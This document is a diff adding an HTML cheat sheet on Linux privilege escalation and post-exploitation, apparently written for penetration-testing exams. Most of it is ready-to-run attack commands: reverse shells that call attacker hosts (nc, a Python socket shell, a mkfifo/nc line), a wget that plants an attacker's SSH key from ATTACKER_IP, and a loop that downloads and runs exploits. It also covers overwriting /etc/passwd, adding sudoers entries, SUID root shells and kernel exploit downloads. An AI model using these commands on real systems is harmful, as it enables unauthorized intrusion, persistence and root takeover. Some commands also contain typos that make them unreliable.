@@ -1,0 +1,239 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Linux elevation of privileges</title>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <link rel="stylesheet" type="text/css" href="/assets/main.css">
+        <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
+        <script src="/assets/syntaxhighlighter.js"></script>
+    </head>
+    <body>
+        <fieldset class='box'>
+            <legend>Linux elevation of privileges ToC</legend>
+                <ul>
+                    <li><span><a href='#Post exploitation'>Post exploitation</a></span></li>
+                    <li><span><a href='#Escaping limited interpreters'>Escaping limited interpreters</a></span></li>
+                    <li><span><a href='#Linux elevation of privileges, manual testing'>Linux elevation of privileges, manual testing</a></span></li>
+                    <li><span><a href='#Scripts to run'>Scripts to run</a></span></li>
+                    <li><span><a href='#Exploits worth running'>Exploits worth running</a></span></li>
+                    <li><span><a href='#Open an xterm remotely'>Open an xterm remotely</a></span></li>
+                    <li><span><a href='#Get proof'>Get proof</a></span></li>
+                    <li><span><a href='#Elevation in 2.6.x:'>Elevation in 2.6.x:</a></span></li>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Post exploitation'></a>
+            <legend>Post exploitation</legend>
+                <p>Get a TTY shell after a reverse shell connection</p>
+                <pre><code>$ python -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
+                <p>Set PATH TERM and SHELL if missing:</p>
+                <pre><code>$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export TERM=xterm
+export SHELL=bash</code></pre>
+                <p>Add public key to authorized keys:</p>
+                <pre><code>$ echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) &gt;&gt; ~/.ssh/authorized_keys</code></pre>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Escaping limited interpreters'></a>
+            <legend>Escaping limited interpreters</legend>
+                <p>Some payloads to overcome limited shells:</p>
+                <pre><code>$ ssh user@$ip nc $localip 4444 -e /bin/sh
+    enter user's password
+$ python -c 'import pty; pty.spawn("/bin/sh")'
+$ export TERM=linux</code></pre>
+                <pre><code>$ python -c 'import pty; pty.spawn("/bin/sh")'</code></pre>
+                <pre><code>$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
+                <pre><code>$ echo os.system('/bin/bash')</code></pre>
+                <pre><code>$ /bin/sh -i</code></pre>
+                <pre><code>$ exec "/bin/sh";</code></pre>
+                <pre><code>$ perl —e 'exec "/bin/sh";'</code></pre>
+                <p>From within tcpdump</p>
+                <pre><code>$ echo $’id\n/bin/netcat $ip 443 -e /bin/bash’ &gt; /tmp/.test
+chmod +x /tmp/.test
+sudo tcpdump -ln -I eth- -w /dev/null -W 1 -G 1 -z /tmp/.tst -Z root</code></pre>
+                <p>From busybox</p>
+                <pre><code>$ /bin/busybox telnetd -|/bin/sh -p9999</code></pre>
+                <pre><code>:!bash
+:set shell=/bin/bash:shell
+!bash
+find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
+awk 'BEGIN {system("/bin/bash")}'
+--interactive
+echo "os.execute('/bin/sh')"
+sudo nmap --script=exploit.nse
+perl -e 'exec "/bin/bash";'</code></pre>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Linux elevation of privileges, manual testing'></a>
+            <legend>Linux elevation of privileges, manual testing</legend>
+                <p>Things to look: Miss-configured services (cronjobs), incorrect file permissions (exportfs, sudo), miss-configured environment ($PATH), binary with SUID bit, software or OS with known vulnerabilities.</p>
+                <p>First try simple sudo:</p>
+                <pre><code>$ sudo su -</code></pre>
+                <p>What can we run with sudo?</p>
+                <pre><code>$ sudo -l</code></pre>
+                <p>Try su as all users and the username as password</p>
+                <p>What services are running as root?:</p>
+                <pre><code>$ ps aux | grep root</code></pre>
+                <p>Look for vulnerable/privileged components such as: mysql, sudo, udev, python</p>
+                <p>If <strong>/etc/exports</strong> if writable, you can add an NFS entry or change and existing entry adding the <strong>no_root_squash</strong> flag to a root directory, put a binary with SUID bit on, and get root.</p>
+                <p>If there is a <strong>cronjob</strong> that runs as run but it has incorrect file permissions, you can change it to run your SUID binary and get a shell.</p>
+                <p>The following command will list processes running by root, permissions and NFS exports.</p>
+                <pre><code>$ echo 'services running as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2&gt;/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2&gt;/dev/null; cat /etc/exports 2&gt;/dev/null</code></pre>
+                <p>Use netstat to find other machines connected</p>
+                <pre><code>$ netstat -ano</code></pre>
+                <p>Command to skip ignored lines in config files</p>
+                <pre><code>$ alias nonempty="egrep -v '^[ \t]*#|^$'"</code></pre>
+                <p>If Mysql is running as root, you can run commands using <strong>sys_exec()</strong>. For instance, to add user to sudoers:</p>
+                <pre><code>sys_exec('usermod -a -G admin username')</code></pre>
+                <p>More about mysql:</p>
+                <pre><code>https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/</code></pre>
+                <p>Find linux distribution &amp; version</p>
+                <pre><code>$ cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;</code></pre>
+                <p>Architecture</p>
+                <pre><code>$ cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release</code></pre>
+                <p>Environment variables</p>
+                <pre><code>$ cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set</code></pre>
+                <p>Find printers</p>
+                <pre><code>$ lpstat -a</code></pre>
+                <p>Find apps installed;</p>
+                <pre><code>$ ls -alh /usr/bin/; ls -alh /sbin/; dpkg -l; rpm -qa; ls -alh /var/cache/apt/archivesO; ls -alh /var/cache/yum/*;</code></pre>
+                <p>Find writable configuration files</p>
+                <pre><code>$ find /etc/ -writable -type f 2&gt;/dev/null</code></pre>
+                <p>Miss-configured services</p>
+                <pre><code>$ cat /etc/syslog.conf; cat /etc/chttp.conf; cat /etc/lighttpd.conf; cat /etc/cups/cupsd.conf; cat /etc/inetd.conf; cat /etc/apache2/apache2.conf; cat /etc/my.conf; cat /etc/httpd/conf/httpd.conf; cat /opt/lampp/etc/httpd.conf; ls -aRl /etc/ | awk '$1 ~ /^.*r.*/</code></pre>
+                <p>Scheduled jobs</p>
+                <pre><code>$ crontab -l; ls -alh /var/spool/cron; ls -al /etc/ | grep cron; ls -al /etc/cron*; cat /etc/cron*; cat /etc/at.allow; cat /etc/at.deny; cat /etc/cron.allow; cat /etc/cron.deny</code></pre>
+                <p>Grep hardcoded passwords</p>
+                <pre><code>$ grep -i user [filename]
+grep -i pass [filename]
+grep -C 5 "password" [filename]
+find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"</code></pre>
+                <p>if web server run in web root:</p>
+                <pre><code>$ grep "localhost" ./ -R</code></pre>
+                <p>Network configuration</p>
+                <pre><code>$ /sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname</code></pre>
+                <p>List other users home directories</p>
+                <pre><code>$ ls -ahlR /root/; ls -ahlR /home/</code></pre>
+                <p>User bash history</p>
+                <pre><code>$ cat ~/.bash_history; cat ~/.nano_history; cat ~/.atftp_history; cat ~/.mysql_history; cat ~/.php_history</code></pre>
+                <p>User mails</p>
+                <pre><code>$ cat ~/.bashrc; cat ~/.profile; cat /var/mail/root; cat /var/spool/mail/root</code></pre>
+                <p>Find interesting binaries</p>
+                <pre><code>$ find / -name wget; find / -name nc*; find / -name netcat*; find / -name tftp*; find / -name ftp</code></pre>
+                <p>Mounted filesystems</p>
+                <pre><code>$ mount; df -h; cat /etc/fstab</code></pre>
+                <p>Look for binaries with the SUID or GUID bits set.</p>
+                <pre><code>$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2&gt;/dev/null
+$ find / -perm -1000 -type d 2&gt;/dev/null
+$ find / -perm -g=s -type f 2&gt;/dev/null</code></pre>
+                <p>Adding a binary to PATH, to hijack another SUID binary invokes it without the fully qualified path.</p>
+                <pre><code>$ function /usr/bin/foo () { /usr/bin/echo "It works"; }
+$ export -f /usr/bin/foo
+$ /usr/bin/foo
+    It works</code></pre>
+                <p>if you can just change PATH, the following will add a poisoned ssh binary:</p>
+                <pre><code> set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
+ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.1 4444 &gt;/tmp/f" &gt;&gt; /tmp/ssh
+ chmod +x ssh</code></pre>
+                <p>Generating SUID C Shell for /bin/bash</p>
+                <pre><code>int main(void){
+    setresuid(0, 0, 0);
+    system("/bin/bash");
+}</code></pre>
+                <p>Without interactive shell</p>
+                <pre><code>$ echo -e '#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' &gt; setuid.c</code></pre>
+                <p>If you can get root to execute anything, the following will change a binary owner to him and set the SUID flag:</p>
+                <pre><code>$ chown root:root /tmp/setuid;chmod 4777 /tmp/setuid;</code></pre>
+                <p>If /etc/passwd has incorrect permissions, you can root:</p>
+                <pre><code> $ echo 'root::0:0:root:/root:/bin/bash' &gt; /etc/passwd; su</code></pre>
+                <p>Add user www-data to sudoers with no password</p>
+                <pre><code>$ echo 'chmod 777 /etc/sudoers &amp;&amp; echo "www-data ALL=NOPASSWD:ALL" &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers' &gt; /tmp/update</code></pre>
+                <p>If you can sudo chmod:</p>
+                <pre><code> $echo -e '#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' &gt; setuid.c $ sudo chown root:root /tmp/setuid; sudo chmod 4777 /tmp/setuid; /tmp/setuid</code></pre>
+                <p>Wildcard injection if there is a cron with a wildcard in the command line, you can create a file, whose name will be passed as an argument to the cron task, For more info:</p>
+                <pre><code>https://www.sans.org/reading-room/whitepapers/testing/attack-defend-linux-privilege-escalation-techniques-2016-37562</code></pre>
+                <p>compile exploit fix error</p>
+                <pre><code>$ gcc 9545.c -o 9545 -Wl,--hash-style=both</code></pre>
+                <p>Find other uses in the system</p>
+                <pre><code> $id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l</code></pre>
+                <p>World readable/writable files:</p>
+                <pre><code>$ echo "world-writeable folders"; find / -writable -type d 2&gt;/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2&gt;/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2&gt;/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2&gt;/dev/null; echo "world-writeable &amp; executable folders"; find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null;</code></pre>
+                <p>Find world-readable files:</p>
+                <pre><code>$ find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print</code></pre>
+                <p>Find nobody owned files</p>
+                <pre><code>$ find /dir -xdev \( -nouser -o -nogroup \) -print</code></pre>
+                <p>Add user to sudoers in python.</p>
+                <pre><code>#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system('echo "username ALL=(ALL:ALL) ALL" &gt;&gt; /etc/sudoers')
+except:
+        sys.exit()</code></pre>
+                <p>Ring0 kernel exploit for 2.3/2.4</p>
+                <pre><code>wget http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c; gcc 36038-6.c -m32 -o ring0; chmod +x ring0; ./ring0</code></pre>
+                <p>Inspect web traffic</p>
+                <pre><code>$ tcpdump tcp port 80 -w output.pcap -i eth0</code></pre>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Scripts to run'></a>
+            <legend>Scripts to run</legend>
+                <p>The following script runs exploit suggester and automatically downloads and executes suggested exploits:</p>
+                <pre><code>https://raw.githubusercontent.com/codingo/OSCP-1/master/xploitdeli.py</code></pre>
+                <pre><code>wget http://www.securitysift.com/download/linuxprivchecker.py</code></pre>
+                <pre><code>wget https://github.com/pentestmonkey/unix-privesc-check</code></pre>
+                <p>Other scripts:</p>
+                <pre><code>wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py</code></pre>
+                <pre><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></pre>
+                <pre><code>wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</code></pre>
+                <pre><code>wget https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl</code></pre>
+                <pre><code>wget  https://www.rebootuser.com/?p=1758</code></pre>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Exploits worth running'></a>
+            <legend>Exploits worth running</legend>
+                <p>CVE-2010-3904 - Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p>
+                <pre><code>https://www.exploit-db.com/exploits/15285/</code></pre>
+                <p>Linux Kernel &lt;= 2.6.37 'Full-Nelson.c'</p>
+                <p>https://www.exploit-db.com/exploits/15704/</p>
+                <p>CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p>
+                <pre><code>https://git.zx2c4.com/CVE-2012-0056/about/</code></pre>
+                <p>Linux CVE 2012-0056</p>
+                <pre><code>wget -O exploit.c &lt;http://www.exploit-db.com/download/18411&gt;
+  gcc -o mempodipper exploit.c
+  ./mempodipper</code></pre>
+                <p>CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p>
+                <pre><code>https://dirtycow.ninja/</code></pre>
+                <p>Compile dirty cow:</p>
+                <pre><code> g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</code></pre>
+                <p>Cross compiling exploits</p>
+                <pre><code>$ gcc -m32 -o output32 hello.c #(32 bit)
+$  gcc -m64 -o output hello.c # (64 bit)</code></pre>
+                <p>Linux 2.6.32</p>
+                <pre><code>https://www.exploit-db.com/exploits/15285/</code></pre>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Open an xterm remotely'></a>
+            <legend>Open an xterm remotely</legend>
+                <p>First, run an xserver in your machine</p>
+                <pre><code>$ Xnest :1</code></pre>
+                <p>Then, bind it to xterm, again in your machine:</p>
+                <pre><code>$ xterm -display 127.0.0.1:1</code></pre>
+                <p>Finally, run the follwing in the remote machine:</p>
+                <pre><code>$ /usr/openwin/bin/xterm -display yourip:1</code></pre>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Get proof'></a>
+            <legend>Get proof</legend>
+                <pre><code>$ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2&gt;/dev/null; cat /Desktop/proof.txt 2&gt;/dev/null;echo " "</code></pre>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Elevation in 2.6.x:'></a>
+            <legend>Elevation in 2.6.x:</legend>
+                <pre><code>$ for a in 9352 9513 33321 15774 15150 15944 9543 33322 9545 25288 40838 40616 40611 ; do wget http://yourIP:8000/$a; chmod +x $a; ./$a; id; done</code></pre>
+        </fieldset>
+    <script>new Highlighter().run(document);</script>
+    <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m = s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-106217827-1', 'auto'); ga('send', 'pageview'); </script>
+    </body>
+</html>
